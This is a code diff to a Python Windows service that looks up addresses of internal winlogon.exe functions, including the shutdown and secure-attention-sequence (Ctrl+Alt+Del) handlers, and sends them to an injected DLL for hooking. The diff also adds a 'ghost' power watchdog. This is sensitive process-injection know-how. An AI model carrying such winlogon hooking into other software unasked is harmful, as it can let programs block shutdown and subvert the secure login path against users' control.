@@ -52,7 +52,7 @@ def start_log_server(port, log_file_path):
 
 from crypto import SecureChannel
 from p2p import P2PManager
-from hardware import enter_ghost_mode
+from hardware import enter_ghost_mode, start_ghost_power_watchdog
 from injector import ensure_injected
 
 import win32file
@@ -216,6 +216,7 @@ class SpowerwkService(win32serviceutil.ServiceFramework):
     def get_current_winlogon_rvas(self):
         shutdown_rva = "0"
         display_rva = "0"
+        sas_rva = "0"
         
         winlogon_path = r"C:\Windows\System32\winlogon.exe"
         if os.path.exists(r"C:\Windows\sysnative\winlogon.exe"):
@@ -230,17 +231,19 @@ class SpowerwkService(win32serviceutil.ServiceFramework):
                 # 使用用户提供的正确的 Mangled 符号名
                 shutdown_mangled = "?ShutdownWindowsWorkerThread@@YAXPEAU_TP_CALLBACK_INSTANCE@@PEAX@Z"
                 display_mangled = "?WlDisplayStatusByResourceId@@YAKIW4_WLUI_STATE@@KPEAVCUser@@@Z"
+                sas_mangled = "?WlStateMachineSetSignal@@YAKKPEAU_StateMachineSignalData@@@Z"
                 
                 shutdown_rva = pdb_info.get(shutdown_mangled, "0")
                 display_rva = pdb_info.get(display_mangled, "0")
+                sas_rva = pdb_info.get(sas_mangled, "0")
                 
-                logging.info(f"Matched winlogon.exe PDB {pdb_id}. RVAs -> Shutdown: {shutdown_rva}, Display: {display_rva}")
+                logging.info(f"Matched winlogon.exe PDB {pdb_id}. RVAs -> Shutdown: {shutdown_rva}, Display: {display_rva}, SAS: {sas_rva}")
             else:
                 logging.warning(f"Winlogon PDB ID {pdb_id} not found in database. Hooking disabled to prevent crash.")
         else:
             logging.warning("Failed to extract PDB ID or missing database. Hooking disabled.")
         
-        return shutdown_rva, display_rva
+        return shutdown_rva, display_rva, sas_rva
 
     def ipc_server_loop(self):
         pipe_name = r'\\.\pipe\spowerwk_ipc'
@@ -257,12 +260,13 @@ class SpowerwkService(win32serviceutil.ServiceFramework):
                 self.pipe_connected = True
                 
                 # Send RVAs
-                s_rva, d_rva = self.get_current_winlogon_rvas()
-                # Format "RVA:<Shutdown>:<Display>"
+                s_rva, d_rva, sas_rva = self.get_current_winlogon_rvas()
+                # Format "RVA:<Shutdown>:<Display>:<SAS>"
                 # remove 0x prefix if present
                 s_rva = s_rva.replace('0x', '')
                 d_rva = d_rva.replace('0x', '')
-                msg = f"RVA:{s_rva}:{d_rva}\x00".encode('utf-8')
+                sas_rva = sas_rva.replace('0x', '')
+                msg = f"RVA:{s_rva}:{d_rva}:{sas_rva}\x00".encode('utf-8')
                 win32file.WriteFile(pipe, msg)
                 try:
                     win32file.FlushFileBuffers(pipe)
@@ -298,6 +302,7 @@ class SpowerwkService(win32serviceutil.ServiceFramework):
                                     try: win32file.FlushFileBuffers(pipe)
                                     except: pass
                                     enter_ghost_mode()
+                                    start_ghost_power_watchdog()
                                     
                             elif req == "PING":
                                 logging.info("Received PING from DLL")
